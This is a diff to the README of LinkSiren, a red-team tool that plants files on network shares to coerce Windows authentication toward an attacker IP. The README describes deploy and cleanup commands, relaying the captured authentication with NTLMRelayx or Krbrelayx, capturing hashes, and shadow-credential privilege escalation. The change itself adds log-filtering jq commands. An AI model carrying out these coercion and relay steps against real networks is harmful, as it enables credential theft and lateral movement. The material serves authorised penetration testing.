@@ -59,12 +59,27 @@ linksiren deploy --attacker <attacker IP> [domain]/username[:password]
     - Use NTLMRelayx from [Impacket](https://github.com/fortra/impacket) to relay to identified targets with pcredz for hash capture on the attacker machine. I highly recommend `-socks` mode with NTLMRelayx.
     - [Krbjack](https://github.com/almandin/krbjack) or [Krbrelayx](https://github.com/dirkjanm/krbrelayx) could be used to relay Kerberos authentication to a machine if you can create a DNS record thanks to the a technique published by James Foreshaw and described in a [blog post](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx) from Synacktiv. Domain users may create new DNS records by default and creating new DNS records is often possible without authentication thanks to [DDSpoof](https://github.com/akamai/DDSpoof). Note that the target service for the relay attack must map to the same service class as the relayed authentication and the service must not implement signing, channel binding, or extended protection for authentication.
 
-5. Cleanup the payload files when the attack is finished. LinkSiren will output messages about any previously written payloads that it isn't able to successfully delete.
+5. Cleanup the payload files when the attack is finished. LinkSiren will output messages about any previously written payloads that it isn't able to successfully delete directly to console.
 ```bash
 linksiren cleanup [domain]/username[:password]
 ```
 
 6. Scan for the WebClient service, now likely started on several machines, see [theHackerRecipes](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/webclient#recon) for details. See this BHIS presentation [Attack Tactics: Shadow Creds for Privesc](https://www.linkedin.com/posts/black-hills-information-security_attack-tactic-shadow-creds-activity-7284615209929891840-Po8m) for how HTTP authentication coerced from the service can be used privesc and lateral movement. Additionally see my blog post [Files that Coerce](https://alittleinsecure.com/files-that-coerce-search-connectors-and-beyond/) for details of how a machine, once taken over using shadow credentials, can be used to coerce authentication from logged in users.
+
+7. If necessary, review the linksiren log which can be filtered on Timesamp, log level (Level), Message, UNC Path (Path), user@domain (User), tool mode (Mode), and exception text if present (Exception).
+```bash
+# Filter by target (ex. 10.0.1.126)
+cat linksiren.log | jq '. | select (.Path | startswith("\\\\10.0.1.126"))'
+
+# Filter log level (ex. ERROR)
+cat linksiren.log | jq '. | select (.Level == "ERROR")'
+
+# Filter by current UTC timestamp. Truncate the format sting to show logs from the current minute/hour/day/month
+cat linksiren.log | TZ=UTC jq '. | select (.Timestamp | startswith(now | strflocaltime("%Y-%m-%dT%H:%M:%S")))'
+
+# Filter by time window specified in ISO 8601 format (ex. start timestamp=1; end timestamp=9999999999)
+cat linksiren.log | TZ=UTC jq '. | select (.Timestamp + "Z" | fromdateiso8601? > 1 and fromdateiso8601? < 9999999999)'
+```
 
 # Attack Path Assocaited with LinkSiren
 1. (Optional) Get Intranet-Zoned if you want to coerce HTTP authentication. See the note in [theHackerRecipes WebClient Abuse](https://www.thehacker.recipes/a-d/movement/mitm-and-coerced-authentications/webclient#abuse) and my blog post [DNS Hijacking: Say My Name](https://alittleinsecure.com/dns-hijacking-say-my-name/).
